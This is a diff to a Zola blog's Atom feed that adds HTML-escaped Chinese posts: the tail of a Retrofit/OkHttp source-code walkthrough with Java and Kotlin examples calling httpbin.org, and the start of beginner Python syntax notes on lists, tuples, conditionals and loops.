+      this.delegate = delegate;
+    }
+&amp;#x2F;&amp;#x2F;ExecutorCallbackCall#execute()
+    @Override
+    public Response&amp;lt;T&amp;gt; execute() throws IOException {
+      return delegate.execute();
+    }
+&amp;#x2F;&amp;#x2F;由上可知delegate是OkHttpCall对象
+&amp;#x2F;&amp;#x2F;OkHttpCall#execute()
+  @Override
+  public Response&amp;lt;T&amp;gt; execute() throws IOException {
+    okhttp3.Call call;
+    ...
+      &amp;#x2F;&amp;#x2F;获取okhttp3.Call对象，具体流程在【流程图】图片有描述
+      call = getRawCall();
+    }
+    ...
+    return parseResponse(call.execute());
+  }
+&amp;#x2F;&amp;#x2F;OkHttpCall#parseResponse(call.execute())
+  Response&amp;lt;T&amp;gt; parseResponse(okhttp3.Response rawResponse) throws IOException {
+    ResponseBody rawBody = rawResponse.body();
+    ...
+    ExceptionCatchingResponseBody catchingBody = new ExceptionCatchingResponseBody(rawBody);
+    try {
+      &amp;#x2F;&amp;#x2F;Converter转换器转换数据，然后返回
+      T body = responseConverter.convert(catchingBody);
+      return Response.success(body, rawResponse);
+    } catch (RuntimeException e) {
+      catchingBody.throwIfCaught();
+      throw e;
+    }
+  }
+&amp;#x2F;&amp;#x2F;最后Converter转换器转换数据，然后返回retrofit2.Response对象，分析3结束。
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h3 id=&quot;zong-jie&quot;&gt;总结&lt;a class=&quot;zola-anchor&quot; href=&quot;#zong-jie&quot; aria-label=&quot;Anchor link for: zong-jie&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;p&gt;&lt;code&gt;sServiceInterface.post(&quot;名字&quot;,&quot;内容&quot;).execute();&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;1.&lt;code&gt;sServiceInterface&lt;&#x2F;code&gt;通过Proxy.newProxyInstance(..)动态代理获取接口ServiceInterface代理对象。&lt;&#x2F;li&gt;
+&lt;li&gt;2.调用&lt;code&gt;post(&quot;名字&quot;,&quot;内容&quot;)&lt;&#x2F;code&gt;方法时，开始执行动态代理内部方法，通过层层解析返回ExecutorCallbackCall类，其中包含OkHttpCall对象变量，OkHttpCall中主要包含了一些okhttp3.Request、okhttp3.Call.execute()等处理。&lt;&#x2F;li&gt;
+&lt;li&gt;3.执行&lt;code&gt;execute()&lt;&#x2F;code&gt;，最后就是执行了okhttp3.Call.execute()。&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;qi-ta&quot;&gt;其他&lt;a class=&quot;zola-anchor&quot; href=&quot;#qi-ta&quot; aria-label=&quot;Anchor link for: qi-ta&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;1.对于super和extends的上界下界：
+List&amp;lt;? super Food&amp;gt; 表示Food的超类，说明Food是?的下界 （只能add，不能get）
+List&amp;lt;? extends Fruit&amp;gt; 表示Fruit的子类，说明Fruit是?的上界 （只能get，不能add）
+class Food{}
+class Fruit extends Food {}&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;hr &#x2F;&gt;
+&lt;h2 id=&quot;6-fu-lu&quot;&gt;6. 附录&lt;a class=&quot;zola-anchor&quot; href=&quot;#6-fu-lu&quot; aria-label=&quot;Anchor link for: 6-fu-lu&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;【4】用法示例源码&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;kotlin&quot; class=&quot;language-kotlin &quot;&gt;&lt;code class=&quot;language-kotlin&quot; data-lang=&quot;kotlin&quot;&gt;interface ServiceInterface {
+
+    companion object {
+        var BASE_URL = &amp;quot;http:&amp;#x2F;&amp;#x2F;www.httpbin.org&amp;#x2F;&amp;quot;
+    }
+
+    @Streaming
+    @GET
+    fun downloadFile(
+        @Header(&amp;quot;RANGE&amp;quot;) downParam: String,
+        @Url fileUrl: String
+    ): Call&amp;lt;ResponseBody&amp;gt;
+
+    @GET(&amp;quot;&amp;#x2F;&amp;quot;)
+    fun get(): Call&amp;lt;ResponseBody&amp;gt;
+
+    @GET(&amp;quot;&amp;#x2F;get&amp;quot;)
+    fun get(@Query(&amp;quot;name&amp;quot;)name:String,@Query(&amp;quot;content&amp;quot;)content: String): Call&amp;lt;HttpBinResponse&amp;gt;
+
+    @GET(&amp;quot;&amp;#x2F;get&amp;quot;)
+    fun get(@QueryName name:String): Call&amp;lt;ResponseBody&amp;gt;
+
+    @POST(&amp;quot;&amp;#x2F;post&amp;quot;)
+    fun post(): Call&amp;lt;ResponseBody&amp;gt;
+
+    @POST(&amp;quot;&amp;#x2F;post&amp;quot;)
+    @FormUrlEncoded
+    fun post(@Field(&amp;quot;name&amp;quot;) name:String,@Field(&amp;quot;content&amp;quot;) content:String): Call&amp;lt;ResponseBody&amp;gt;
+
+    @POST(&amp;quot;&amp;#x2F;post&amp;quot;)
+    @Multipart
+    fun post(@Part(&amp;quot;va&amp;quot;) va:RequestBody,@Part(&amp;quot;name\&amp;quot;; filename=\&amp;quot;name.png&amp;quot;)name: File, @Part(&amp;quot;name2\&amp;quot;; filename=\&amp;quot;name2.png&amp;quot;)name2: File): Call&amp;lt;ResponseBody&amp;gt;
+}
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre data-lang=&quot;java&quot; class=&quot;language-java &quot;&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;public class Main {
+
+    private static ServiceInterface sServiceInterface = new Retrofit.Builder().baseUrl(ServiceInterface.Companion.getBASE_URL()).client(
+            new OkHttpClient.Builder().addInterceptor(new Interceptor() {
+
+                private volatile String host;
+
+                public void setHost(String host) {
+                    this.host = host;
+                }
+
+                @NotNull
+                @Override
+                public okhttp3.Response intercept(@NotNull Chain chain) throws IOException {
+                        Request request = chain.request();
+                    String host = this.host;
+                    if (host != null) {
+                        HttpUrl newUrl = request.url().newBuilder().host(host).build();
+                        request = request.newBuilder().url(newUrl).build();
+                    }
+                    return chain.proceed(request);
+                }
+            }).build())
+            .addCallAdapterFactory(RxJava2CallAdapterFactory.create())
+            .addConverterFactory(ApiConverterFactory.create())
+            .build().create(ServiceInterface.class);
+
+    {
+&amp;#x2F;&amp;#x2F;        System.setProperty(&amp;quot;http.proxyHost&amp;quot;, &amp;quot;127.0.0.1&amp;quot;);
+&amp;#x2F;&amp;#x2F;        System.setProperty(&amp;quot;https.proxyHost&amp;quot;, &amp;quot;127.0.0.1&amp;quot;);
+&amp;#x2F;&amp;#x2F;        System.setProperty(&amp;quot;http.proxyPort&amp;quot;, &amp;quot;8888&amp;quot;);
+&amp;#x2F;&amp;#x2F;        System.setProperty(&amp;quot;https.proxyPort&amp;quot;, &amp;quot;8888&amp;quot;);
+    }
+
+    public static void main(String[] args) throws Exception {
+    }
+
+    &amp;#x2F;**
+     * Get请求,
+     *&amp;#x2F;
+    @Test
+    public void testGet(){
+        String s = null;
+        try {
+            Response&amp;lt;ResponseBody&amp;gt; response = sServiceInterface.get().execute();
+            s = response.body().string();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        System.out.println(s);
+    }
+
+    &amp;#x2F;**
+     * Get请求下载，带有 @Streaming
+     *&amp;#x2F;
+    @Test
+    public void testGetDownload(){
+        String url = &amp;quot;https:&amp;#x2F;&amp;#x2F;www.httpbin.org&amp;#x2F;image&amp;#x2F;png&amp;quot;;
+        try {
+            Response&amp;lt;ResponseBody&amp;gt; response = sServiceInterface.downloadFile(&amp;quot;Range: bytes=0-&amp;quot;,url).execute();
+            BufferedSink sink = Okio.buffer(Okio.sink(new File(&amp;quot;C:\\Users\\Administrator\\Desktop&amp;quot;, &amp;quot;testImage.png&amp;quot;)));
+            sink.writeAll(response.body().source());
+            sink.close();
+            System.out.println(&amp;quot;req图片&amp;quot;);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+
+    &amp;#x2F;**
+     * Get请求,带有@QueryName ?name
+     *&amp;#x2F;
+    @Test
+    public void testGetQueryName(){
+        String s = null;
+        try {
+            Response&amp;lt;ResponseBody&amp;gt; response = sServiceInterface.get(&amp;quot;name&amp;quot;).execute();
+            s = response.body().string();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        System.out.println(s);
+    }
+
+    &amp;#x2F;**
+     * Get请求,带有@Query ?name=value&amp;amp;name2=value2
+     *&amp;#x2F;
+    @Test
+    public void testGetQuery(){
+        String s = null;
+        try {
+            Response&amp;lt;HttpBinResponse&amp;gt; response = sServiceInterface.get(&amp;quot;名字&amp;quot;,&amp;quot;内容&amp;quot;).execute();
+            s = response.body().getData();
+            System.out.println(&amp;quot;url=&amp;quot;+new Gson().fromJson(s,HttpBinResponse.Entity.class).getUrl()+&amp;quot; \n&amp;quot;+s);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    &amp;#x2F;**
+     * Post请求
+     *&amp;#x2F;
+    @Test
+    public void testPost(){
+        String s = null;
+        try {
+            Response&amp;lt;ResponseBody&amp;gt; response = sServiceInterface.post().execute();
+            s = response.body().string();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        System.out.println(s);
+    }
+
+    &amp;#x2F;**
+     * Post请求，表单提交 @FormUrlEncoded @Field
+     *&amp;#x2F;
+    @Test
+    public void testPostFormUrlEncoded(){
+        String s = null;
+        try {
+            Response&amp;lt;ResponseBody&amp;gt; response = sServiceInterface.post(&amp;quot;名字&amp;quot;,&amp;quot;内容&amp;quot;).execute();
+            s = response.body().string();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        System.out.println(s);
+    }
+
+    &amp;#x2F;**
+     * Post请求，多部分表单提交 @Multipart @Part
+     *&amp;#x2F;
+    @Test
+    public void testPostMultipart() {
+        RequestBody aa = RequestBody.create(&amp;quot;name=11&amp;amp;value=22&amp;quot;, MediaType.parse(&amp;quot;text&amp;#x2F;plain&amp;quot;));
+        try {
+            Response&amp;lt;ResponseBody&amp;gt; response = sServiceInterface.post(aa,new File(&amp;quot;C:\\Users\\Administrator\\Desktop\\1.png&amp;quot;),new File(&amp;quot;C:\\Users\\Administrator\\Desktop\\2.png&amp;quot;)).execute();
+            String s = response.body().string();
+            System.out.println(s);
+            HttpBinResponse.Entity entity = new Gson().fromJson(s, HttpBinResponse.Entity.class);
+            String name = entity.getFile().get(&amp;quot;name&amp;quot;).replace(&amp;quot;data:image&amp;#x2F;png;base64,&amp;quot;,&amp;quot;&amp;quot;);
+            File file = new File(&amp;quot;C:\\Users\\Administrator\\Desktop\\multipart.png&amp;quot;);
+            FileOutputStream out = new FileOutputStream(file);
+            out.write(Base64.getDecoder().decode(name));
+            out.flush();
+            out.close();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre data-lang=&quot;java&quot; class=&quot;language-java &quot;&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;public class ApiConverterFactory extends Converter.Factory{
+
+    public static ApiConverterFactory create(){
+        return new ApiConverterFactory();
+    }
+
+    @Nullable
+    @Override
+    public Converter&amp;lt;?, RequestBody&amp;gt; requestBodyConverter(Type type, Annotation[] parameterAnnotations, Annotation[] methodAnnotations, Retrofit retrofit) {
+        return new ApiRequestBodyConverter();
+    }
+
+    @Nullable
+    @Override
+    public Converter&amp;lt;ResponseBody, ?&amp;gt; responseBodyConverter(Type type, Annotation[] annotations, Retrofit retrofit) {
+        return new ApiResponseBodyConverter();
+    }
+}
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre data-lang=&quot;java&quot; class=&quot;language-java &quot;&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;public class ApiRequestBodyConverter implements Converter&amp;lt;File, RequestBody&amp;gt; {
+    @Nullable
+    @Override
+    public RequestBody convert(File value) throws IOException {
+        if(value.getAbsolutePath().contains(&amp;quot;.png&amp;quot;)){
+            RequestBody bodyParams = RequestBody.create(value,MediaType.parse(&amp;quot;image&amp;#x2F;png&amp;quot;));
+            return bodyParams;
+        }
+        return null;
+    }
+}
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre data-lang=&quot;java&quot; class=&quot;language-java &quot;&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;public class ApiResponseBodyConverter implements Converter&amp;lt;ResponseBody, HttpBinResponse&amp;gt; {
+
+    @Nullable
+    @Override
+    public HttpBinResponse convert(ResponseBody value) throws IOException {
+        String json = value.string();
+        HttpBinResponse response = new HttpBinResponse();
+        try{
+            response.setCode(1);
+            response.setMessage(&amp;quot;Success&amp;quot;);
+            response.setData(json);
+        }catch (Exception e){
+            e.printStackTrace();
+        }
+        return response;
+    }
+}
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre data-lang=&quot;java&quot; class=&quot;language-java &quot;&gt;&lt;code class=&quot;language-java&quot; data-lang=&quot;java&quot;&gt;public class HttpBinResponse {
+
+    private String message;
+    private int code;
+    private Entity entity;
+    private String data;
+
+    public String getMessage() {
+        return message;
+    }
+
+    public void setMessage(String message) {
+        this.message = message;
+    }
+
+    public int getCode() {
+        return code;
+    }
+
+    public void setCode(int code) {
+        this.code = code;
+    }
+
+    public Entity getEntity() {
+        return entity;
+    }
+
+    public void setEntity(Entity entity) {
+        this.entity = entity;
+    }
+
+    public String getData() {
+        return data;
+    }
+
+    public void setData(String data) {
+        this.data = data;
+    }
+
+    public static class Entity{
+        private Object args;
+        private String data;
+        private Map&amp;lt;String,String&amp;gt; files;
+        private Map&amp;lt;String,String&amp;gt; form;
+        private Map&amp;lt;String,String&amp;gt; headers;
+        private String json;
+        private String origin;
+        private String url;
+
+        public Object getArg() {
+            return args;
+        }
+
+        public void setArg(Object arg) {
+            args = arg;
+        }
+
+        public String getData() {
+            return data;
+        }
+
+        public void setData(String data) {
+            this.data = data;
+        }
+
+        public Map&amp;lt;String,String&amp;gt; getFile() {
+            return files;
+        }
+
+        public void setFile(Map&amp;lt;String,String&amp;gt; file) {
+            files = file;
+        }
+
+        public Map&amp;lt;String, String&amp;gt; getForm() {
+            return form;
+        }
+
+        public void setForm(Map&amp;lt;String, String&amp;gt; form) {
+            this.form = form;
+        }
+
+        public Map&amp;lt;String, String&amp;gt; getHeader() {
+            return headers;
+        }
+
+        public void setHeader(Map&amp;lt;String, String&amp;gt; header) {
+            headers = header;
+        }
+
+        public String getJson() {
+            return json;
+        }
+
+        public void setJson(String json) {
+            this.json = json;
+        }
+
+        public String getOrigin() {
+            return origin;
+        }
+
+        public void setOrigin(String origin) {
+            this.origin = origin;
+        }
+
+        public String getUrl() {
+            return url;
+        }
+
+        public void setUrl(String url) {
+            this.url = url;
+        }
+
+        @Override
+        public String toString() {
+            return &amp;quot;Data{&amp;quot; +
+                    &amp;quot;args=&amp;quot; + args +
+                    &amp;quot;, data=&amp;#x27;&amp;quot; + data + &amp;#x27;\&amp;#x27;&amp;#x27; +
+                    &amp;quot;, files=&amp;quot; + files +
+                    &amp;quot;, form=&amp;quot; + form +
+                    &amp;quot;, headers=&amp;quot; + headers +
+                    &amp;quot;, json=&amp;#x27;&amp;quot; + json + &amp;#x27;\&amp;#x27;&amp;#x27; +
+                    &amp;quot;, origin=&amp;#x27;&amp;quot; + origin + &amp;#x27;\&amp;#x27;&amp;#x27; +
+                    &amp;quot;, url=&amp;#x27;&amp;quot; + url + &amp;#x27;\&amp;#x27;&amp;#x27; +
+                    &amp;#x27;}&amp;#x27;;
+        }
+    }
+}
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="zh">
+        <title>Python语法</title>
+        <published>2021-10-10T00:00:00+00:00</published>
+        <updated>2025-09-03T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              Obelieve
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://obelieve.github.io/blog/pythonyu-fa/"/>
+        <id>https://obelieve.github.io/blog/pythonyu-fa/</id>
+        
+        <content type="html" xml:base="https://obelieve.github.io/blog/pythonyu-fa/">&lt;p&gt;[TOC]&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;zhu&quot;&gt;注:&lt;a class=&quot;zola-anchor&quot; href=&quot;#zhu&quot; aria-label=&quot;Anchor link for: zhu&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;ul&gt;
+&lt;li&gt;跨行字符串使用&lt;code&gt;&#x27;&#x27;&#x27;&lt;&#x2F;code&gt;表示&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;callable(object)&lt;&#x2F;code&gt;可调用对象判断函数，类是可调用对象，实例需要实现&lt;code&gt;__call__&lt;&#x2F;code&gt;方法&lt;&#x2F;li&gt;
+&lt;li&gt;if条件句变式
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;A&amp;gt; if &amp;lt;B&amp;gt; else &amp;lt;C&amp;gt;&lt;&#x2F;code&gt; 默认返回A,如果B为False返回C&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;if &amp;lt;A&amp;gt; is not &amp;lt;B&amp;gt;:&lt;&#x2F;code&gt; 字面意思A不是B,为True&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;if not &amp;lt;A&amp;gt;:&lt;&#x2F;code&gt; A是空(False),为True&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;一个类中，相同方法名，后面方法覆盖前面方法&lt;&#x2F;li&gt;
+&lt;li&gt;魔法方法
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;__setattr__&lt;&#x2F;code&gt; 拦截赋值 重写该方法，当实例对属性进行赋值时，会调用该方法&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;__getattr__&lt;&#x2F;code&gt; 拦截运算 重写该方法，当实例直接引用不能存在的属性时，会调用该方法&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;&#x2F;&#x2F;&lt;&#x2F;code&gt; ：做除法并返回不大于结果的整数&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;[cls(**r) for r in rs]&lt;&#x2F;code&gt;,cls表示类接收一个关键字参数，rs表示迭代器。
+通过迭代器把关键字参数传入到cls中，然后返回一个list对象&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h2 id=&quot;1-zhi-xing-mo-shi&quot;&gt;1.执行模式&lt;a class=&quot;zola-anchor&quot; href=&quot;#1-zhi-xing-mo-shi&quot; aria-label=&quot;Anchor link for: 1-zhi-xing-mo-shi&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;h3 id=&quot;1-jiao-hu-shi-mo-shi-zhi-jie-shu-ru-bing-jie-shi&quot;&gt;1.交互式模式(直接输入，并解释)&lt;a class=&quot;zola-anchor&quot; href=&quot;#1-jiao-hu-shi-mo-shi-zhi-jie-shu-ru-bing-jie-shi&quot; aria-label=&quot;Anchor link for: 1-jiao-hu-shi-mo-shi-zhi-jie-shu-ru-bing-jie-shi&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;p&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt;print(&quot;hello world&quot;)&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;2-ming-ling-xing-mo-shi&quot;&gt;2.命令行模式&lt;a class=&quot;zola-anchor&quot; href=&quot;#2-ming-ling-xing-mo-shi&quot; aria-label=&quot;Anchor link for: 2-ming-ling-xing-mo-shi&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;2.1内置函数:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;I&#x2F;O
+input()
+print()&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;Python3.x使用Unicode编码：
+ord() #字符转为整数表示
+chr() #整数转为字符表示
+PS：ord(&#x27;A&#x27;) 输出65
+chr(666) 输出&#x27;ʚ&#x27;&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;编码&#x2F;解码
+&quot;ascii&quot; 是bytes(字节方式,b前缀)，在bytes中，无法显示为ASCII字符的字节，用\x##显示。
+&quot;utf-8&quot;
+encode() #用什么编码,
+decode() #用什么解码
+PS： ‘A’.encode(&#x27;ascii&#x27;)输出b&#x27;A&#x27;&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;其他
+len() #字符&#x2F;字节长度
+format() #格式化输出
+help(&amp;lt;func_name&amp;gt;) #查看函数用法&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;
+&lt;p&gt;重新加载模块&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;import importlib
+importlib.reload(&amp;lt;module_name&amp;gt;)
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h2 id=&quot;2-yu-fa-guan-jian-zi&quot;&gt;2.语法-关键字&lt;a class=&quot;zola-anchor&quot; href=&quot;#2-yu-fa-guan-jian-zi&quot; aria-label=&quot;Anchor link for: 2-yu-fa-guan-jian-zi&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;h3 id=&quot;2-1bian-liang-lei-xing-ren-yi-dong-tai-yu-yan-bian-liang-lei-xing-gu-ding-jing-tai-yu-yan&quot;&gt;2.1变量类型任意-动态语言，变量类型固定-静态语言&lt;a class=&quot;zola-anchor&quot; href=&quot;#2-1bian-liang-lei-xing-ren-yi-dong-tai-yu-yan-bian-liang-lei-xing-gu-ding-jing-tai-yu-yan&quot; aria-label=&quot;Anchor link for: 2-1bian-liang-lei-xing-ren-yi-dong-tai-yu-yan-bian-liang-lei-xing-gu-ding-jing-tai-yu-yan&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;1.语句缩进风格，大小写区分&lt;&#x2F;li&gt;
+&lt;li&gt;2.数据类型：
+浮点型：&quot;2e5&quot;表示 2*10的5次方，&quot;2e-5&quot; 表示2*10的-5次方
+布尔型：&quot;True&quot; 或 &quot;False&quot;
+逻辑符号： &quot;and&quot;(与)、&quot;or&quot;(或)、&quot;not&quot;(非)
+空值：&quot;None&quot;&lt;&#x2F;li&gt;
+&lt;li&gt;3.除法：&quot;&#x2F;&#x2F;&quot;表示除法最后结果只取整数部分&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;2-2ge-shi-hua-shu-chu&quot;&gt;2.2格式化输出&lt;a class=&quot;zola-anchor&quot; href=&quot;#2-2ge-shi-hua-shu-chu&quot; aria-label=&quot;Anchor link for: 2-2ge-shi-hua-shu-chu&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;1.使用 “%”
+PS: print(&quot;Hello,%s&quot;%&#x27;World&#x27;,&quot;ok%d&quot;%3)
+输出 Hello,World ok3&lt;&#x2F;li&gt;
+&lt;li&gt;2.使用format(),使用占位符{0},{1}...
+PS：print(&quot;{0},{1}&quot;.format(&#x27;Hello&#x27;,&#x27;World&#x27;))&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;2-3-list-ke-bian-shu-zu-zhong-gua-hao-he-tuple-bu-ke-bian-shu-zu-xiao-gua-hao&quot;&gt;2.3  list(可变数组 &lt;code&gt;&amp;lt;中括号&amp;gt; []&lt;&#x2F;code&gt;)和tuple(不可变数组 &lt;code&gt;&amp;lt;小括号&amp;gt; ()&lt;&#x2F;code&gt;)&lt;a class=&quot;zola-anchor&quot; href=&quot;#2-3-list-ke-bian-shu-zu-zhong-gua-hao-he-tuple-bu-ke-bian-shu-zu-xiao-gua-hao&quot; aria-label=&quot;Anchor link for: 2-3-list-ke-bian-shu-zu-zhong-gua-hao-he-tuple-bu-ke-bian-shu-zu-xiao-gua-hao&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;list相关
+&lt;ul&gt;
+&lt;li&gt;1.list定义：&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;num=[1,2,3]
+num=[] (空数组)
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;2.访问list：&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;num[0]输出 1
+num[1]输出 2
+num[-1]输出 3
+num[-2]输出 2
+num[-3]输出 1
+num[-4]报错
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;3.增加list元素：&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;num.append(&amp;quot;a&amp;quot;) 输出 [1,2,3,&amp;#x27;a&amp;#x27;]
+num.insert(1,1.1) 输出 [1,1.1,2,3,&amp;#x27;a&amp;#x27;]
+num.insert(-1,&amp;#x27;last_1&amp;#x27;) 输出[1,1.1,2,3,&amp;#x27;last_1&amp;#x27;,&amp;#x27;a&amp;#x27;]
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;4.删除list元素：&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;num.pop()输出[1,1.1,2,3,&amp;#x27;last_1&amp;#x27;]
+num.pop(1)输出[1,2,3,&amp;#x27;last_1&amp;#x27;]
+num.pop(-1)输出[1,2,3]
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;tuple相关
+&lt;ul&gt;
+&lt;li&gt;1.tuple定义：&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;#没有&amp;quot;增加&amp;#x2F;删除&amp;quot;方法,数组不变
+num=[1,2]
+finalNum=(1,2,num)
+finalNum=()(空数组)
+如果定义finalNum=(1)，python防止和表达式歧义，
+规定finalNum变量表示数字1。
+可以这样表示 finalNum=(1,)
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ul&gt;
+&lt;li&gt;2.访问tuple：&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre&gt;&lt;code&gt;finalNum[0]输出 1
+finalNum[1]输出 2
+finalNum[-1]输出 [1,2]
+finalNum[-1][0] 输出 1
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;2-4-tiao-jian-pan-duan&quot;&gt;2.4 条件判断&lt;a class=&quot;zola-anchor&quot; href=&quot;#2-4-tiao-jian-pan-duan&quot; aria-label=&quot;Anchor link for: 2-4-tiao-jian-pan-duan&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;关键字 &quot;if&quot;、&quot;else&quot;、&quot;elif&quot;(else if 缩写)、&lt;code&gt;&quot;:&quot;&lt;&#x2F;code&gt;(冒号)&lt;&#x2F;li&gt;
+&lt;li&gt;格式&lt;pre&gt;&lt;code&gt;&amp;lt;条件判断&amp;gt;:非零数值、非空字符串、非空数组 为True，否则 False
+if&amp;lt;条件判断&amp;gt;: #要加冒号 &amp;quot;:&amp;quot;
+	&amp;lt;执行&amp;gt;
+elif&amp;lt;条件判断&amp;gt;:
+	&amp;lt;执行&amp;gt;
+else：
+	&amp;lt;执行&amp;gt;
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;字符串不能和数字比较&lt;pre&gt;&lt;code&gt;b = input() #input()返回是字符串类型，需要转为数字
+b = int(b) #int()方法，转为整数
+b&amp;gt;100
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;2-5-xun-huan&quot;&gt;2.5 循环&lt;a class=&quot;zola-anchor&quot; href=&quot;#2-5-xun-huan&quot; aria-label=&quot;Anchor link for: 2-5-xun-huan&quot;&gt;🔗&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;for &amp;lt;指代变量&amp;gt; in &amp;lt;数组&amp;gt;:&lt;&#x2F;code&gt;&lt;pre&gt;&lt;code&gt;range(100) #返回整数序列的range对象
+list(range(100)) #转为数组表示[1,2,...,99]
+&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;code&gt;while &amp;lt;条件&amp;gt;:&amp;lt;缩进&amp;gt; &amp;lt;执行&amp;gt;&lt;&#x2F;code&gt;
+&lt;code&gt;break&lt;&#x2F;code&gt;   退出循环
